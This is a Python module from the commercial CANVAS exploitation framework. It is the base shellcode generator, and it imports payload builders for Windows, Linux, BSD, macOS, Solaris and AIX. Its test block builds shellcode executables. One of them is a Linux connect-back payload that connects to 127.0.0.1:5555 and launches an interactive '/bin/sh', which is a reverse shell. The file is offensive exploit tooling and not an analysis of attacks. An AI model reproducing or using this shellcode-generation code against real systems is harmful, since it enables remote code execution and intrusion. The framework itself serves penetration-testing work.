#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
base shellcodeGenerator module for importing from
"""

import sys
sys.path.append("./")
from exploitutils import *

import random

try:
    from x86shellcodegenerator import X86
    from win32shellcodegenerator import win32
    from linuxX86shellcodegenerator import linux_X86
    from solarisSPARCshellcodeGenerator import solarisSparc
    from bsdX86shellcodegenerator import bsd_X86
    from osxX86shellcodegenerator import osx_X86
    from osxPPCshellcodeGenerator import osxPPC
    from linuxshellcodegenerator import linux_mipsel, linux_armel, linux_ppc
    from aixShellcodeGenerator import aix_powerpc
    from solarisx86shellcodegenerator import solaris_X86
except:
    print "CRI version"
    raise
    #print "missing some imports - you are most likely using the stripped CRI version"
    #import traceback
    #traceback.print_exc()
#MAIN
if __name__=="__main__":
    from MOSDEF import makeexe

    if 0:
        badstring="\x00\x55\x11\x40\x20!@#%^"
        print "Trying to load EAX with 4 in 10 different ways avoiding these characters: \n%s\n"%hexprint(badstring)
        for i in range(0,10):
            myx86=X86()
            result=myx86.load_long("%eax",4,badstring)
            print "%d: %s"%(i,hexprint(result))
    if 1:
        mywin32=win32()
        scstr=mywin32.testMe()
        #smallest tcp shellcode is 457 - with stackswap is 555
        #smallest go shellcode is 661
        print "Length of win32 shellcode is %d"%len(scstr)
        makeexe.makelinuxexe("A"*0x1500+"\xcc"+scstr,"a.out")
        print "Code=%s"%mywin32.getcode()

    if 0:
        #test connect shellcode
        mylinux=linux_X86()
        #mylinux.addAttr("debugme",None)
        mylinux.addAttr("Normalize Stack",[0])
        mylinux.addAttr("connect",{"ipaddress" : "127.0.0.1", "port": 5555})
        mylinux.addAttr("execve",{"argv": ["/bin/sh","-i"],"envp": [],"filename": "/bin/sh"})
        str=mylinux.get()
        #have to have a lot of A's to make the "stack" look normal.
        makeexe.makelinuxexe("A"*0x1500+str,"a.out")
        print "Wrote a.out"

    
